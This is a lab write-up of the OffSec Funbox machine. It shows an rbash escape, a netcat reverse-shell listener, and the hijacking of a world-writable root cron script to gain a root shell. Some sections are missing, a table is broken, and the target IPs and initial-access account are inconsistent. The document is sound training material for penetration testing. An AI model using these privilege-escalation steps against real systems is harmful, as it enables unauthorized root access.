
# OffSec Funbox — Full Writeup

## Overview

|            |                              |
| ---------- | ---------------------------- |
| **Target** | `192.168.148.77`             |
| **OS**     | Ubuntu Linux                 |
| **Stack**  | Apache 2.4.41 · WordPress · MySQL X · ProFTPD · OpenSSH 8.2p1 |
| **Flags**  | `local.txt` · `proof.txt`   |

### Lab Description

An insecure MySQL database is exploited to gain access to WordPress credentials, which are used to upload a PHP reverse shell. Privilege escalation is achieved by exploiting a world-writable backup script executed by root via a cron job.

### Learning Objectives

- Scan the target for open services using Nmap and identify a WordPress site and MySQL service.
- Use Hydra to brute-force SSH credentials for an enumerated WordPress user.
- Escape a restricted shell (`rbash`) to enumerate the file system.
- Identify a world-writable script executed on a schedule by root.
- Inject a reverse shell payload into the script and escalate to root.

## 4 · Post-Exploitation — Escaping rbash

### 4.1 — Discovering the Restricted Shell

Attempting basic enumeration reveals we are trapped in a restricted shell (`rbash`):

```
joe@funbox:~$ sudo -l
[sudo] password for joe: 
Sorry, user joe may not run sudo on funbox.

joe@funbox:~$ pwd
/home/joe

joe@funbox:~$ cd /home
-rbash: cd: restricted
joe@funbox:~$ cd ..
-rbash: cd: restricted
```

### 4.2 — rbash Escape Methodology

> **For OSCP, don't memorize one trick. Memorize a methodology.**

When you encounter `-rbash: cd: restricted`, your thought process should be:

```
1. Am I really in rbash?
2. What binaries do I have?
3. Is there an easy escape?
4. Restore a normal shell.
```

**Step 1 (Fastest) — Try invoking Bash directly:**

```
/bin/bash
```

or simply:

```
bash
```

Then verify with:

```
echo $0
```

If it prints `bash`, you're free.

### 4.3 — Escaping

```
joe@funbox:~$ cd /home
-rbash: cd: restricted
joe@funbox:~$ /bin/bash
-rbash: /bin/bash: restricted: cannot specify `/' in command names
joe@funbox:~$ bash
joe@funbox:~$ cd /home
joe@funbox:/home$ ls
funny  joe
```

> `/bin/bash` failed because `rbash` blocks commands containing `/`. However, the bare `bash` command succeeds because it's resolved via `$PATH` without an explicit path separator.

| ---- | ----------- | ------- |
| `.backup.sh` | `-rwxrwxrwx` (world-writable) | Archives `/var/www/html` into `html.tar` |
| `.reminder.sh` | `-rw-rw-r--` | Hints that `.backup.sh` runs "on and on" (repeatedly) |

### 5.2 — Forming the Hypothesis

> `.reminder.sh` says: *"the hidden backup.sh backups the entire webspace **on and on**."*

This is the clue. A world-writable script that runs repeatedly — we need to confirm **who** executes it.

```
World-writable script
        ↓
Clue says it runs repeatedly
        ↓
Need to know who executes it
        ↓
Run pspy
```

- ✅ The script is executed **automatically**.
- ✅ It is executed as **root**.
- ✅ We can **modify** the script (world-writable).

## 6 · Privilege Escalation — Cron Job Hijack

### 6.1 — Generating the Payload

We visit [revshells.com](https://www.revshells.com/) to generate a reverse shell one-liner.

![](../../attachments/Pasted%20image%2020260719223137.png)

### 6.2 — Starting the Listener

On Kali:

```
rlwrap -cAr nc -lvnp 4444
```

### 6.3 — Injecting the Payload

We append our reverse shell command to `.backup.sh`:

```
joe@funbox:/home/funny$ nano .backup.sh
```

![](../../attachments/Pasted%20image%2020260719223320.png)

The reverse shell payload is appended to the end of the file, leaving the original `tar` command intact. Save and exit.

### 6.4 — Catching the Shell (Attempt 1 — funny)

The first callback arrives from `UID=1000 (funny)`, since that cron fires every 2 minutes:

```
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.246] from (UNKNOWN) [192.168.246.77] 39582
sh: 0: can't access tty; job control turned off
$ id
uid=1000(funny) gid=1000(funny) groups=1000(funny),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

This is **not** root — it's the `funny` user's cron firing first. We need to wait for the root execution cycle.

**Strategy:** Keep the payload in `.backup.sh`, exit this shell, restart the listener, and wait for root's 5-minute cron to fire.

### 6.5 — Catching the Shell (Attempt 2 — root) 🎯

We restart the listener and wait:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...

connect to [192.168.45.246] from (UNKNOWN) [192.168.246.77] 39586
sh: 0: can't access tty; job control turned off
# # whoami
root
```

> 🔓 **Root shell obtained.**

## Lessons Learned

### 1. Virtual Host Resolution
When Nmap reports an HTTP redirect to a hostname, always add it to `/etc/hosts`. Without this, the site won't load and you'll miss the entire web attack surface.

### 2. rbash Escape Methodology
Don't panic when you see `rbash: cd: restricted`. Follow the checklist:
1. Confirm you're in `rbash` (`echo $0`).
2. Try `bash` (not `/bin/bash` — rbash blocks `/` in commands).
3. Escalate from there.

### 3. World-Writable Scripts + Scheduled Execution = Root
The privilege escalation pattern here is a classic:
- **Find** a world-writable script.
- **Confirm** it runs automatically (use `pspy`).
- **Confirm** it runs as root.
- **Inject** a reverse shell and wait.

### 4. Patience with Multiple Cron Schedules
When both a regular user and root execute the same script on different schedules, the first shell you catch may not be root. Don't abandon the approach — restart your listener and wait for the root cycle.

### 5. pspy Over Manual Cron Enumeration
For OSCP, `pspy` is faster and more reliable than manually checking `/etc/crontab`, `/var/spool/cron/`, and systemd timers. It shows **exactly** what runs, as which user, in real time.
